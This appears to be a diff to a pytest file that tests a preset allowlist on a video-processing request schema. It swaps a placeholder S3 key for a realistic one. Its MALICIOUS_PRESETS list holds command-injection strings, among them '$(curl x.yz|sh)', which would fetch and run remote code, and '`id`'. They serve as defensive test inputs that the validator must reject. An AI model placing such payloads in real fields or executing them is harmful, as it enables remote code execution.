@@ -22,6 +22,9 @@ from pydantic import ValidationError
 from core.schemas import ProcessVideoRequest
 from core.subtitles import create_subtitles_with_ffmpeg
 
+# A real upload key (generate-upload-url.use-case.ts format, RNF-SEC-19).
+VALID_S3_KEY = "uploads/user_1/8f14e45f-ceea-4e67-a1b2-3c4d5e6f7a8b/podcast.mp4"
+
 MALICIOUS_PRESETS = [
     "$(curl x.yz|sh)",
     "`id`",
@@ -58,15 +61,15 @@ class TestProcessVideoRequestPresetAllowlist:
     @pytest.mark.parametrize("preset", MALICIOUS_PRESETS)
     def test_rejects_preset_outside_allowlist(self, preset):
         with pytest.raises(ValidationError):
-            ProcessVideoRequest(s3_key="uploads/x.mp4", preset=preset)
+            ProcessVideoRequest(s3_key=VALID_S3_KEY, preset=preset)
 
     @pytest.mark.parametrize("preset", UI_PRESETS)
     def test_accepts_every_preset_the_ui_sends(self, preset):
-        req = ProcessVideoRequest(s3_key="uploads/x.mp4", preset=preset)
+        req = ProcessVideoRequest(s3_key=VALID_S3_KEY, preset=preset)
         assert req.preset == preset
 
     def test_default_preset_is_still_hormozi(self):
-        assert ProcessVideoRequest(s3_key="uploads/x.mp4").preset == "HORMOZI"
+        assert ProcessVideoRequest(s3_key=VALID_S3_KEY).preset == "HORMOZI"
 
     def test_allowlist_covers_every_ui_preset(self):
         from core.schemas import SUBTITLE_PRESETS
